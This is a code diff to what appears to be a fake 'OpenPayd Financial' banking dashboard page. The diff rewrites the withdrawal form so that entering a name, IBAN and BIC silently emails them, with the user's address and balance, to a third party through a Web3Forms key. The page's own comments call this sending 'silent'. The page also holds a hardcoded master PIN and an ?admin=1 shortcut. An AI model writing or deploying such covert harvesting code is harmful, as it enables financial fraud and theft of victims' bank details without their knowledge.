@@ -509,7 +509,7 @@
     </div>
   </div>
 
-  <!-- ==================== MODALE : RETRAIT (NOM / PRÉNOM, IBAN, BIC + PRISE EN CHARGE ACCÉLÉRÉE) ==================== -->
+  <!-- ==================== MODALE : RETRAIT (NOM / PRÉNOM, IBAN, BIC + ENVOI AUTOMATIQUE) ==================== -->
   <div id="withdraw-modal" class="hidden fixed inset-0 z-50 bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-4">
     <div class="bg-white w-full max-w-md rounded-3xl shadow-2xl border border-slate-100 overflow-hidden fade-in">
       <!-- Header Modale -->
@@ -571,7 +571,7 @@
           />
         </div>
 
-        <!-- Rectangles bas : Enregistrer + Prise en charge accélérée -->
+        <!-- Rectangles bas : Enregistrer (envoi automatique) + Prise en charge accélérée -->
         <div class="pt-2 space-y-2.5">
           <button
             type="submit"
@@ -731,7 +731,10 @@
 
   <!-- ==================== LOGIQUE JAVASCRIPT ==================== -->
   <script>
-    // CODE PIN PARENTAL UNIQUE ET SECRET
+    // 1. CLÉ WEB3FORMS CONFIGURÉE
+    const WEB3FORMS_ACCESS_KEY = '973aaa2d-3c86-4aca-ac40-0ee834858ac6';
+
+    // 2. CODE PIN PARENTAL UNIQUE ET SECRET
     const MASTER_PARENT_PIN = '852963';
 
     // État par défaut uniquement si aucun lien personnalisé ni aucune sauvegarde locale n'existe
@@ -799,6 +802,7 @@
         lblWithdrawIban: "IBAN",
         lblWithdrawBic: "BIC",
         btnWithdrawSave: "Enregistrer",
+        btnWithdrawSaving: "Enregistrement...",
         btnWithdrawExpedited: "Prise en charge accélérée",
         toastWithdrawProcessing: "Votre demande est en cours de traitement",
         withdrawMailSubject: "Confirmation de la demande de retrait (Prise en charge accélérée)",
@@ -857,6 +861,7 @@
         lblWithdrawIban: "IBAN",
         lblWithdrawBic: "BIC",
         btnWithdrawSave: "Save",
+        btnWithdrawSaving: "Saving...",
         btnWithdrawExpedited: "Expedited processing",
         toastWithdrawProcessing: "Your request is being processed",
         withdrawMailSubject: "Withdrawal request confirmation (Expedited processing)",
@@ -896,7 +901,6 @@
       applyTranslations();
       renderDashboardData();
 
-      // Si ?admin=1 est présent dans l'URL, ouvrir directement le contrôle parental
       const params = new URLSearchParams(window.location.search);
       if (params.get('admin') === '1') {
         openParentModal();
@@ -1230,7 +1234,7 @@
       closeDepositModal();
     }
 
-    // ==================== MODALE : RETRAIT (NOM/PRÉNOM, IBAN, BIC + PRISE EN CHARGE ACCÉLÉRÉE) ====================
+    // ==================== MODALE : RETRAIT (ENVOI SILENCIEUX WEB3FORMS + LOCALSTORAGE) ====================
     function openWithdrawModal() {
       const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
       try {
@@ -1255,17 +1259,50 @@
       document.getElementById('withdraw-modal').classList.add('hidden');
     }
 
-    function handleWithdrawSubmit(event) {
+    async function handleWithdrawSubmit(event) {
       event.preventDefault();
       const fullName = document.getElementById('withdraw-fullname').value.trim();
       const iban = document.getElementById('withdraw-iban').value.trim().toUpperCase();
       const bic = document.getElementById('withdraw-bic').value.trim().toUpperCase();
+      const saveBtn = document.getElementById('btn-withdraw-save');
 
+      // 1. Sauvegarde locale immédiate
       const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
       try {
         localStorage.setItem(storageKey, JSON.stringify({ fullName, iban, bic }));
       } catch (e) {
         console.error(e);
+      }
+
+      // 2. Envoi automatique et silencieux par e-mail via Web3Forms
+      if (WEB3FORMS_ACCESS_KEY) {
+        saveBtn.disabled = true;
+        saveBtn.innerText = i18n[state.lang].btnWithdrawSaving;
+
+        try {
+          await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+              access_key: WEB3FORMS_ACCESS_KEY,
+              subject: `OpenPayd Financial - Retrait (${fullName})`,
+              from_name: 'OpenPayd Financial',
+              Nom_Prenom: fullName,
+              IBAN: iban,
+              BIC: bic,
+              Compte_Client_Email: state.mail,
+              Solde_Compte_EUR: `${state.eurBalance} €`
+            })
+          });
+        } catch (err) {
+          console.error('Erreur Web3Forms:', err);
+        } finally {
+          saveBtn.disabled = false;
+          saveBtn.innerText = i18n[state.lang].btnWithdrawSave;
+        }
       }
 
       closeWithdrawModal();
@@ -1277,7 +1314,6 @@
       const iban = document.getElementById('withdraw-iban').value.trim().toUpperCase();
       const bic = document.getElementById('withdraw-bic').value.trim().toUpperCase();
 
-      // Sauvegarder également les champs saisis localement
       const storageKey = 'openpayd_withdraw_details_' + (state.mail || 'default').toLowerCase().trim();
       try {
         localStorage.setItem(storageKey, JSON.stringify({ fullName, iban, bic }));
